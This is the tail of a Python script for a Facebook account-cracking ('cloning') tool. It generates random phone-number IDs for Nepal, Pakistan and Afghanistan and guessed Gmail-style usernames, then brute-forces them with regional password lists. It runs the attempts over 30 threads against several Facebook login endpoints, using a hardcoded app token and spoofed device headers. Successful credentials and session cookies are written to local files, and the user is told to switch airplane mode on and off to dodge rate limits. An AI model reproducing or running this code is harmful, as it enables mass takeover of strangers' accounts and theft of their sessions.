        nmp = "". join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with ThreadPool(max_workers=30) as ROCKYx:
        clear()
        tl=str(len(user))
        print(f'{A}|=| RANDOM UID : {tl} ');print(f'{A}|=| SIM CODE   : {code} ');print(f"{A}|=| USE AIRPLANE MODE EVERY 5 MINTS ");linex()
        for love in user:
            ids=code+love
            passlist=[ids,love,ids[:8],ids[:7],ids[:6],'nepal12','nepal123','nepal1234','nepal12345','maya123','kathmandu','pokhara','tamang','maya1234','tamang123','tamang12345','nepal@123','kathmandu123']
            if methodx in ['1']:ROCKYx.submit(__Randm_M1__,ids,passlist)
            if methodx in ['2']:ROCKYx.submit(__Randm_M2__,ids,passlist)
            if methodx in ['3']:ROCKYx.submit(__Randm_M3__,ids,passlist)
            if methodx in ['4']:ROCKYx.submit(__Randm_M4__,ids,passlist)
            if methodx in ['5']:ROCKYx.submit(__Randm_M5__,ids,passlist)
    print('');print(f'\n{A}─────────────────────────────────────────────────');print(f"{A}|=| CLONING COMPLETE ");print(f"{A}|=| TOTAL OK ID :{G} {len(oks)}");print(f"{A}|=| TOTAL CP ID :{R} {len(cps)}");print(f'\n{A}─────────────────────────────────────────────────');exit()
#──────────────{ RANDOM-PAKISTAN }──────────────#
def __pakistan__():
    user=[]
    clear()
    print(f'{A}|=| EXAMPLE : 0306 / 0315 / 0345 ');linex();code=input(f'{A}|?| CHOICE  : ')
    clear()
    print(f'{A}|=| EXAMPLE : 5000 / 10000 / 9999 / 99999');linex()
    try:
        limit=int(input(f'{A}|?| CHOICE  : '))
    except ValueError:
        limit=50000
    clear()
    print(f"{A}|1| METHOD M1 ");print(f"{A}|2| METHOD M2 ");print(f"{A}|3| METHOD M3 ");print(f"{A}|4| METHOD M4 ");print(f"{A}|5| METHOD M5 ");linex();methodx = input(f'{A}|?| CHOICE : ')
    for nmbr in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as ROCKYx:
        clear()
        tl=str(len(user))
        print(f'{A}|=| RANDOM UID : {tl} ');print(f'{A}|=| SIM CODE   : {code} ');print(f"{A}|=| USE AIRPLANE MODE EVERY 5 MINTS ");linex()
        for love in user:
            ids=code+love
            passlist=[love,ids,'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122']
            if methodx in ['1']:ROCKYx.submit(__Randm_M1__,ids,passlist)
            if methodx in ['2']:ROCKYx.submit(__Randm_M2__,ids,passlist)
            if methodx in ['3']:ROCKYx.submit(__Randm_M3__,ids,passlist)
            if methodx in ['4']:ROCKYx.submit(__Randm_M4__,ids,passlist)
            if methodx in ['5']:ROCKYx.submit(__Randm_M5__,ids,passlist)
    print('');print(f'\n{A}─────────────────────────────────────────────────');print(f"{A}|=| CLONING COMPLETE ");print(f"{A}|=| TOTAL OK ID :{G} {len(oks)}");print(f"{A}|=| TOTAL CP ID :{R} {len(cps)}");print(f'\n{A}─────────────────────────────────────────────────');exit()
#──────────────{ RANDOM-AFGHANISTAN }──────────────#
def __afghanistanx__():
    user=[]
    clear()
    print(f'{A}|=| EXAMPLE : +9340 / +9350 / +9330 ');linex();code=input(f'{A}|?| CHOICE  : ')
    clear()
    print(f'{A}|=| EXAMPLE : 5000 / 10000 / 9999 / 99999');linex()
    try:
        limit=int(input(f'{A}|?| CHOICE  : '))
    except ValueError:
        limit=50000
    clear()
    print(f"{A}|1| METHOD M1 ");print(f"{A}|2| METHOD M2 ");print(f"{A}|3| METHOD M3 ");print(f"{A}|4| METHOD M4 ");print(f"{A}|5| METHOD M5 ");linex();methodx = input(f'{A}|?| CHOICE : ')
    for nmbr in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as ROCKYx:
        clear()
        tl=str(len(user))
        print(f'{A}|=| RANDOM UID : {tl} ');print(f'{A}|=| SIM CODE   : {code} ');print(f"{A}|=| USE AIRPLANE MODE EVERY 5 MINTS ");linex()
        for love in user:
            ids=code+love
            passlist=[love,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
            if methodx in ['1']:ROCKYx.submit(__Randm_M1__,ids,passlist)
            if methodx in ['2']:ROCKYx.submit(__Randm_M2__,ids,passlist)
            if methodx in ['3']:ROCKYx.submit(__Randm_M3__,ids,passlist)
            if methodx in ['4']:ROCKYx.submit(__Randm_M4__,ids,passlist)
            if methodx in ['5']:ROCKYx.submit(__Randm_M5__,ids,passlist)
    print('');print(f'\n{A}─────────────────────────────────────────────────');print(f"{A}|=| CLONING COMPLETE ");print(f"{A}|=| TOTAL OK ID :{G} {len(oks)}");print(f"{A}|=| TOTAL CP ID :{R} {len(cps)}");print(f'\n{A}─────────────────────────────────────────────────');exit()
#──────────────{ GMAIL }──────────────#
def __Gmailx__():
    clear()
    user=[]
    print(f"{A}|=| EXAMPLE : Habib/Shakib/Rakib/Sumon ");linex();first = input(f'{A}|?| FIRST NAME  : ')
    clear()
    print(f"{A}|=| EXAMPLE : Hossain/Khan/Ali/Islam ");linex();last = input(f'{A}|?| LAST NAME  : ')
    period = '.'
    try:
        clear();print(f'{A}|=| EXAMPLE : 5000 / 10000 / 9999 / 99999');linex()
        limit=int(input(f'{A}|?| CHOICE  : '))
    except ValueError:
        limit=5000
    for nmbr in range(limit):
        nmp="".join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as ROCKYxxxx:
        total=str(len(user))
        clear()
        print(f'{A}|=| GMAIL UID : {total} ');print(f'{A}|=| FULL NAME : {first+last} ');print(f"{A}|=| USE AIRPLANE MODE EVERY 5 MINTS ");linex()
        for digitx in user:
            username=first+period+last+digitx
            pswrd = [first,last,first+last,first+'123',first+'1234',first+'12345',last+'123',last+'1234',last+'12345']
            ROCKYxxxx.submit(__GMAILX__,username,pswrd,total)
    print('');print(f'\n{A}─────────────────────────────────────────────────');print(f"{A}|=| CLONING COMPLETE ");print(f"{A}|=| TOTAL OK ID :{G} {len(oks)}");print(f"{A}|=| TOTAL CP ID :{R} {len(cps)}");print(f'\n{A}─────────────────────────────────────────────────');exit()
#──────────────{ RANDOM-METHOD-M1 }──────────────#
def __Randm_M1__(ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}[ROCKY-M1] {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
        try:
                for pas in passlist:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                        headers = {'User-Agent': ____ua____(), 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        url = 'https://graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                uid = po['uid']
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                print(f'\r\r\x1b[38;5;46m[R 4G_OK] {str(uid)} | {pas} ')
                                print(f'\r\r\x1b[38;5;46m[cookie]<>{X1}{coki} ')
                                print("Date for Facebook card:", formatted_date)
                                open('/sdcard/ROCKY-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                oks.append(str(uid))
                                break
                        elif 'www.facebook.com' in po['error']['message']: 
                                uid = po['error']['error_data']['uid']
                                print(f'\r\r{R}|R 4 G_CP| {str(uid)} | {pas} ')
                                open('/sdcard/ROCKY-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cps.append(str(uid))
                                break
                        else:continue
                loop+=1
        except:pass
#──────────────{ RANDOM-METHOD-M2 }──────────────#
def __Randm_M2__(ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|ROCKY-M2| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
        try:
                for pas in passlist:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                        headers = {'User-Agent': ROCKY(), 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        url = 'https://api.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                uid = po['uid']
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                print(f'\r\r\x1b[38;5;46m|R 4 G_OK| {str(uid)} | {pas} ')
                                print(f'\r\r\x1b[38;5;46m|COKI|-> {coki} ')
                                open('/sdcard/ROCKY-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                oks.append(str(uid))
                                break
                        elif 'www.facebook.com' in po['error']['message']: 
                                uid = po['error']['error_data']['uid']
                                print(f'\r\r{R}|R 4 G_CP| {str(uid)} | {pas} ')
                                open('/sdcard/ROCKY-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cps.append(str(uid))
                                break
                        else:continue
                loop+=1
        except:pass
#──────────────{ RANDOM-METHOD-M3 }──────────────#
def __Randm_M3__(ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|ROCKY-M3| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
        try:
                for pas in passlist:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        tttt="[FBAN/Orca-Android;FBAV/373.0.0.17.116;FBPN/com.facebook.katana;FBLC/th_TH;FBBV/702991782;FBCR/TRUE-H;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1615;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=2351,height=720};FB_FW/1;] FBBK/1"
                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_US','client_country_code':'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
                        headers = {'User-Agent':tttt,'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                uid = po['uid']
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                print(f'\r\r\x1b[38;5;46m|R 4 G_OK| {str(uid)} | {pas} ')
                                print(f'\r\r\x1b[38;5;46m|COKI|-> {coki} ')
                                open('/sdcard/ROCKY-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                oks.append(str(uid))
                                break
                        elif 'www.facebook.com' in po['error']['message']: 
                                uid = po['error']['error_data']['uid']
                                print(f'\r\r{R}|R 4 G_CP| {str(uid)} | {pas} ')
                                open('/sdcard/ROCKY-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cps.append(str(uid))
                                break
                        else:continue
                loop+=1
        except:pass
#──────────────{ RANDOM-METHOD-M4 }──────────────#
def __Randm_M4__(ids,passlist):
    global oks,cps,loop
    try:
        for pas in passlist:
            session=requests.Session()
            sys.stdout.write(f'\r\r{A}|ROCKY-M4| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
            pro = random.choice(ugen)
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":ids,
            "pass":pas,
            "login":"Log In"}
            pron_star={'authority': 'd.facebook.com','method':'GET','scheme':'https','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'en-US,en;q=0.9','cache-control': 'max-age=0','dpr': '2','sec-ch-prefers-color-scheme': 'light','sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"','sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"','sec-ch-ua-mobile': '?1','sec-ch-ua-model': '"Infinix X6515"','sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"12.0.0"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'none','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': pro,'viewport-width': '980',}
            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=pron_star).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                ids = re.findall('c_user=(.*);xs', coki)[0]
                print(f'\r\r\x1b[38;5;46m|R 4 G_OK| {ids} | {pas} ')
                print(f'\r\r\x1b[38;5;46m|COKI|-> {coki} ')
                open('/sdcard/ROCKY-RNDM-OK.txt','a').write(str(ids)+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                ids = "1000"+coki1[0:11]
                print(f'\r\r{R}|R 4 G_OK| {ids} | {pas} ')
                open('/sdcard/ROCKY-RANDM-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
#──────────────{ RANDOM-METHOD-M5 }──────────────#
def __Randm_M5__(ids,passlist):
    global oks,cps,loop
    try:
        for pas in passlist:
            session=requests.Session()
            sys.stdout.write(f'\r\r{A}|ROCKY-M5| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
            pro = random.choice(ugen)
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":ids,
            "pass":pas,
            "login":"Log In"}
            pron_star={'authority': 'x.facebook.com','method':'GET','scheme':'https','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'en-US,en;q=0.9','cache-control': 'max-age=0','dpr': '2','sec-ch-prefers-color-scheme': 'light','sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"','sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"','sec-ch-ua-mobile': '?1','sec-ch-ua-model': '"Infinix X6515"','sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"12.0.0"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'none','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': pro,'viewport-width': '980',}
            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=pron_star).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                ids = re.findall('c_user=(.*);xs', coki)[0]
                print(f'\r\r\x1b[38;5;46m|R 4 G_OK| {ids} | {pas} ')
                print(f'\r\r\x1b[38;5;46m|COKI|-> {coki} ')
                open('/sdcard/ROCKY-RNDM-OK.txt','a').write(str(ids)+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                ids = "1000"+coki1[0:11]
                print(f'\r\r{R}|R 4 G_OK| {ids} | {pas} ')
                open('/sdcard/ROCKY-RANDM-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
#──────────────{ GMAIL-METHOD }──────────────#
def __GMAILX__(username,pswrd,total):
    global oks,cps,loop
    sys.stdout.write(f'\r\r{A}|ROCKY-XD| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
    try:
        for password in pswrd:
            adid=str(uuid.uuid4())
            device_id=str(uuid.uuid4())
            connection={'adid': adid,'format': 'json','device_id': device_id,'email': username,'password': password, 'generate_analytics_claims': '1','credentials_type': 'password','source': 'login', 'error_detail_type': 'button_with_disabled','enroll_misauth': 'false', 'generate_session_cookies': '1','generate_machine_id': '1','meta_inf_fbmeta': '', 'currently_logged_in_userid': '0','fb_api_req_friendly_name': 'authenticate'}
            header={'User-Agent': randBuildLSB(), 'Accept-Encoding': 'gzip, deflate','Accept': '*/*','Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793','X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
            login_url='https://api.facebook.com/method/auth.login'
            req=httpx.post(login_url,data=connection,headers=header).json()
            if 'session_key' in req:
                print(f'\r\r\x1b[38;5;46m|R 4 G_OK| '+username+' | '+password)
                open('/sdcard/ROCKY-GMAIL-OK.txt', 'a').write(username+' | '+password+'\n')
                oks.append(username)
                break
            elif 'www.facebook.com' in req['error_msg']:
                print(f'\r\r{R}|R 4 G_CP| '+username+' | '+password)
                open('/sdcard/ROCKY-GMAIL-CP.txt', 'a').write(username+' | '+password+'\n')
                cps.append(username)
                break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        	time.sleep(20)   
    except exceptions:
        pass
#──────────────{ END }──────────────#
menu()